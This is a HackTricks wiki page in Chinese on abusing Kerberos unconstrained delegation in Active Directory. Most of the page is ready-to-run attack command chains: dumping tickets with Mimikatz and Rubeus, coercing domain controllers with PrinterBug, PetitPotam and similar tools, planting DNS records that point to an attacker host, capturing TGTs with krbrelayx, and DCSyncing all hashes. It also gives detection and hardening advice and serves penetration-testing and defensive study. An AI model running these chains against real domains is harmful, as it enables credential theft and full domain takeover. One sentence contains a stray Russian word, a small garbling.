# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

这是 Domain Administrator 可以为域内任意 **Computer** 设置的一项功能。此后，每当某个**用户登录**该 Computer 时，该用户的 **TGT 副本**都会由 DC **放入所提供的 TGS 中并保存在 LSASS 的内存中**。因此，如果你在该机器上拥有 Administrator 权限，就可以**转储 tickets 并在任意机器上 impersonate 这些用户**。

因此，如果某个 domain admin 登录启用了 "Unconstrained Delegation" 功能的 Computer，而你在该机器上拥有 local admin 权限，那么你就可以转储该 ticket，并在任意位置 impersonate Domain Admin（domain privesc）。

你可以通过检查 [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 属性是否包含 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)，来**查找具有此属性的 Computer 对象**。你可以使用 LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ 来完成此操作，这也是 powerview 的实现方式：
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
将 Administrator（或受害用户）的 ticket 使用 **Mimikatz** 或 **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.** 加载到内存中。\
更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**有关 ired.team 上 Unconstrained delegation 的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

如果攻击者能够** компрометировать 一台允许使用 "Unconstrained Delegation" 的计算机**，他就可以**诱骗** **Print server** 自动向该计算机**登录**，从而将一个 **TGT** 保存到服务器的内存中。\
随后，攻击者可以执行 **Pass the Ticket attack 来冒充** Print server 计算机账户对应的用户。

要让 Print server 登录到任意计算机，可以使用 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
如果 TGT 来自域控制器，你可以执行 [**DCSync attack**](acl-persistence-abuse/index.html#dcsync)，并获取 DC 上的所有哈希。\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

在此查找其他**强制身份验证**的方法：


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

任何能够让受害者通过 **Kerberos** 向你的 unconstrained-delegation 主机进行身份验证的其他 coercion primitive 也同样有效。在现代环境中，这通常意味着根据可访问的 RPC surface，将经典的 PrinterBug 流程替换为 **PetitPotam**、**DFSCoerce**、**ShadowCoerce**、**MS-EVEN** 或基于 **WebClient/WebDAV** 的 coercion。

### 滥用配置了 unconstrained delegation 的用户/服务账户

Unconstrained delegation **并不局限于计算机对象**。**用户/服务账户**同样可以配置为 `TRUSTED_FOR_DELEGATION`。在这种情况下，实际要求是该账户必须接收发往其**拥有的 SPN** 的 Kerberos service tickets。

这会产生 2 条非常常见的 offensive 路径：

1. 你入侵了 unconstrained-delegation **用户账户**的密码/哈希，然后向该账户**添加 SPN**。
2. 该账户已经拥有一个或多个 SPN，但其中一个指向**过期/已停用的主机名**；重新创建缺失的 **DNS A record** 即可劫持身份验证流程，而无需修改 SPN 集。<sup>[[8]](#references)</sup>

最简 Linux 流程：
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
备注：

- 当不受限委派主体是一个 **service account**，且你只有其凭据、没有在已加入域的主机上执行代码的权限时，这一点尤其有用。
- 如果目标用户已经拥有一个**过时的 SPN**，重新创建对应的 **DNS record** 可能比向 AD 中写入新的 SPN 更不易引起注意。
- 近期以 Linux 为中心的 tradecraft 使用 `addspn.py`、`dnstool.py`、`krbrelayx.py` 和一种 coercion primitive；完成整个链条不需要接触 Windows 主机。

### 使用攻击者创建的 computer 滥用不受限委派

现代域通常具有 `MachineAccountQuota > 0`（默认值为 10），允许任意已认证主体创建最多 N 个 computer 对象。如果你还持有 `SeEnableDelegationPrivilege` token privilege（或等效权限），就可以将新创建的 computer 设置为受信任的无约束委派主体，并从特权系统中 harvest 入站 TGT。<sup>[[1]](#references)</sup>

高级流程：

1) 创建一个由你控制的 computer
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) 让伪造的主机名可在域内解析
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) 在攻击者控制的计算机上启用 Unconstrained Delegation
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
为什么有效：使用 unconstrained delegation 时，启用了 delegation 的计算机上的 LSA 会缓存传入的 TGT。如果诱使 DC 或特权服务器向你的伪造主机进行身份验证，其计算机 TGT 就会被存储，并且可以导出。

4) 以 export mode 启动 krbrelayx，并准备 Kerberos 材料
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) 从 DC/servers 向你的 fake host 强制发起 authentication
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx 会在计算机进行身份验证时保存 ccache 文件，例如：
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) 使用捕获的 DC machine TGT 执行 DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
注意事项和要求：

- `MachineAccountQuota > 0` enables unprivileged computer creation；否则需要显式权限。
- 在 computer 上设置 `TRUSTED_FOR_DELEGATION` 需要 `SeEnableDelegationPrivilege`（或 domain admin）。
- 确保 fake host 的名称解析正常（DNS A 记录），以便 DC 能通过 FQDN 访问它。
- Coercion 需要可用的 vector（PrinterBug/MS-RPRN、EFSRPC/PetitPotam、DFSCoerce、MS-EVEN 等）。如果可能，应在 DC 上禁用这些功能。
- 如果 victim account 被标记为 **"Account is sensitive and cannot be delegated"**，或属于 **Protected Users**，转发的 TGT 将不会包含在 service ticket 中，因此该 chain 无法获取可复用的 TGT。<sup>[[9]](#references)</sup>
- 如果 authenticating client/server 启用了 **Credential Guard**，Windows 会阻止 **Kerberos unconstrained delegation**，这可能导致从 operator 角度看原本有效的 coercion paths 失败。

检测和 hardening 思路：

- 当 UAC 设置了 `TRUSTED_FOR_DELEGATION` 时，针对 Event ID 4741（computer account created）以及 4742/4738（computer/user account changed）生成 alert。
- 监控 domain zone 中异常的 DNS A-record 添加。
- 关注来自非预期 hosts 的 4768/4769 激增，以及 DC 向非 DC hosts 进行 authentication 的情况。
- 将 `SeEnableDelegationPrivilege` 限制给最少量的账户，在可行时将 `MachineAccountQuota=0`，并在 DC 上禁用 Print Spooler。强制启用 LDAP signing 和 channel binding。

### Mitigation

- 将 DA/Admin 登录限制到指定 services
- 为 privileged accounts 设置 "Account is sensitive and cannot be delegated"。

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
